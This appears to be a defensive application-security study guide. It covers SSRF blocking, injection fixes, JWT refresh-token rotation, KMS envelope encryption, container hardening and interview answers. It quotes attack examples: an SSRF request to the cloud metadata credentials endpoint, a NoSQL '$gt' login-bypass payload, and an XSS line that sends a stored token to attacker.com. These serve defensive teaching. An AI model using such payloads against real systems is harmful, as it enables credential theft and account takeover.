# 01 — Application Security & Defense-in-Depth

> **Context**: Production Security Engineering. Covers OWASP Top 10 mitigations, JWT revocation architecture, OAuth 2.0 with PKCE, envelope encryption with KMS, and container hardening.

---

## 1. OWASP Top 10: Attack Vectors & Production Defenses

### 1.1 Server-Side Request Forgery (SSRF)
**The Attack**: An application accepts a URL from the client to fetch an image or webhook (e.g. `POST /api/fetch-avatar { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }`). The server makes the request from inside the private AWS VPC, leaking EC2/ECS IAM credentials directly to the attacker.

#### The Staff-Level Defense: DNS Resolution Validation & Private IP Blocklist
```typescript
import ipaddr from 'ipaddr.js';
import dns from 'dns/promises';

export async function validateSafeWebhookUrl(inputUrl: string): Promise<string> {
  const parsed = new URL(inputUrl);

  // 1. Enforce HTTPS only
  if (parsed.protocol !== 'https:') {
    throw new Error('Insecure protocol: Only HTTPS allowed');
  }

  // 2. Resolve DNS to get all target IP addresses
  const addresses = await dns.lookup(parsed.hostname, { all: true });

  for (const { address } of addresses) {
    const addr = ipaddr.parse(address);

    // 3. Reject loopback, link-local (169.254.x.x), RFC 1918 private subnets (10.x, 172.16.x, 192.168.x)
    if (
      addr.range() === 'loopback' ||
      addr.range() === 'linkLocal' ||
      addr.range() === 'private' ||
      addr.range() === 'carrierGradeNat'
    ) {
      throw new Error(`SSRF Blocked: Destination IP ${address} is in restricted range: ${addr.range()}`);
    }
  }

  return inputUrl;
}
```

---

### 1.2 SQL & NoSQL Injection
- **SQL Injection**: String concatenation in queries (`WHERE email = '${input}'`).
  - *Fix*: Parameterized prepared statements (`$1`, `?`).
- **NoSQL Object Injection** (MongoDB / Express):
  - *Vulnerability*: Sending `{"username": "admin", "password": {"$gt": ""}}`. In naive code `db.users.findOne(req.body)`, MongoDB evaluates `$gt: ""` as true, bypassing password verification.
  - *Fix*: Strict schema validation with Zod / Joi to force strings, plus `express-mongo-sanitize` to strip `$` and `.` prefixes.

---

## 2. Authentication: JWT Lifecycle & Token Revocation

### 2.1 The Stateless JWT Revocation Paradox
Stateless JWTs cannot be invalidated before expiration without consulting a central store, defeating pure statelessness.

```
Client
  ├── Access Token (JWT): Valid for 15 minutes, stored in memory (never localStorage!)
  └── Refresh Token: Valid for 7 days, stored in HttpOnly, Secure, SameSite=Strict cookie
```

### 2.2 Refresh Token Rotation with Automatic Breach Detection
When a refresh token is used to issue a new access token, it is **invalidated immediately**, and a new refresh token is issued (Refresh Token Rotation).

```
Family ID: fam_9124
Active Token: ref_v1 ──► [Used once] ──► ref_v2 (Valid)
                             │
                             ▼ (Attacker replays stolen ref_v1!)
          ALERT: Token reuse detected! Invalidate ENTIRE Family (fam_9124)!
```

```typescript
// src/services/authService.ts
export async function refreshAccessToken(rawRefreshToken: string) {
  const tokenHash = crypto.createHash('sha256').update(rawRefreshToken).digest('hex');

  const tokenRecord = await prisma.refreshToken.findUnique({
    where: { tokenHash },
    include: { user: true },
  });

  if (!tokenRecord) {
    throw new UnauthorizedError('Invalid refresh token');
  }

  // BREACH DETECTION: If a previously revoked token is presented again,
  // the token was intercepted! Revoke all tokens for this user session family!
  if (tokenRecord.revokedAt !== null) {
    await prisma.refreshToken.updateMany({
      where: { familyId: tokenRecord.familyId },
      data: { revokedAt: new Date() },
    });
    logger.fatal({ userId: tokenRecord.userId }, 'SECURITY ALERT: Refresh token reuse detected!');
    throw new SecurityBreachError('Token reuse detected. All active sessions invalidated.');
  }

  // 1. Revoke current token
  await prisma.refreshToken.update({
    where: { id: tokenRecord.id },
    data: { revokedAt: new Date() },
  });

  // 2. Issue new rotated refresh token + new access token
  const newRefreshToken = crypto.randomBytes(32).toString('hex');
  const newHash = crypto.createHash('sha256').update(newRefreshToken).digest('hex');

  await prisma.refreshToken.create({
    data: {
      userId: tokenRecord.userId,
      familyId: tokenRecord.familyId,
      tokenHash: newHash,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
    },
  });

  const accessToken = jwt.sign(
    { sub: tokenRecord.userId, role: tokenRecord.user.role },
    process.env.JWT_SECRET!,
    { expiresIn: '15m' }
  );

  return { accessToken, newRefreshToken };
}
```

---

## 3. Cryptography & Envelope Encryption with AWS KMS

### 3.1 The Envelope Encryption Pattern
Encrypting large payloads directly with KMS is expensive, slow, and hits API rate limits.
Instead, use **Envelope Encryption**:
1. **Customer Master Key (CMK)** stored in AWS KMS never leaves the hardware security module (HSM).
2. App requests a plaintext **Data Encryption Key (DEK)** + **Encrypted DEK** from KMS.
3. App encrypts data locally using AES-256-GCM with the plaintext DEK.
4. App destroys plaintext DEK in memory, storing only the encrypted data + encrypted DEK.

```
KMS Master Key (CMK)
       │ GenerateDataKey()
       ├──► Plaintext DEK (Used locally to encrypt PII) ──► Wiped from RAM
       └──► Encrypted DEK ──► Stored alongside ciphertext in PostgreSQL table
```

---

## 4. Container & Infrastructure Security Hardening

```dockerfile
# Production Security-Hardened Dockerfile Example
FROM node:20-alpine AS runtime

# 1. Install security patches and create unprivileged user
RUN apk --no-cache upgrade && \
    addgroup -g 10001 appgroup && \
    adduser -u 10001 -G appgroup -s /sbin/nologin -D appuser

WORKDIR /app
COPY --chown=appuser:appgroup dist/ ./dist/
COPY --chown=appuser:appgroup package*.json ./
RUN npm ci --omit=dev

# 2. Drop all Linux capabilities and switch to non-root user
USER 10001:10001

# 3. Read-only filesystem guarantee at container runtime
# Docker run flag: --read-only --tmpfs /tmp:rw,noexec,nosuid
CMD ["node", "dist/server.js"]
```

---

## 5. Senior Interview Q&A Cheatsheet

### Q1: "Why is storing JWT access tokens in `localStorage` an anti-pattern, and what is the secure alternative?"
> **Answer**: `localStorage` is accessible to any JavaScript running in the browser context. A single Cross-Site Scripting (XSS) vulnerability anywhere in the application (or via a compromised npm dependency) allows an attacker to exfiltrate the token via `fetch('attacker.com?t=' + localStorage.getItem('token'))`.
> **Alternative**: Store access tokens **in memory** (inside a React state variable or closure), and store the refresh token inside an **`HttpOnly; Secure; SameSite=Strict` cookie**. `HttpOnly` cookies are strictly inaccessible to browser JavaScript, completely immunizing the refresh mechanism from XSS exfiltration.

### Q2: "What is an OAuth 2.0 PKCE (Proof Key for Code Exchange) flow and why is it mandatory for SPAs and mobile apps?"
> **Answer**: In traditional OAuth 2.0, an application exchanges an authorization code for tokens using a `client_secret`. Public clients (Single Page Apps, React, Next.js client-side, mobile Flutter apps) cannot securely store a client secret without exposing it in downloaded source code.
> **PKCE** eliminates the client secret:
> 1. Client creates a random `code_verifier` and hashes it to produce a `code_challenge`.
> 2. Sends `code_challenge` in initial authorization request.
> 3. Identity Provider issues authorization code tied to that challenge.
> 4. Client exchanges the code by sending the plaintext `code_verifier`.
> 5. Identity Provider hashes it and verifies match before issuing tokens.
> Even if a malicious app intercepts the authorization code via custom URI scheme hijacking, it cannot exchange it without the unhashed `code_verifier`.
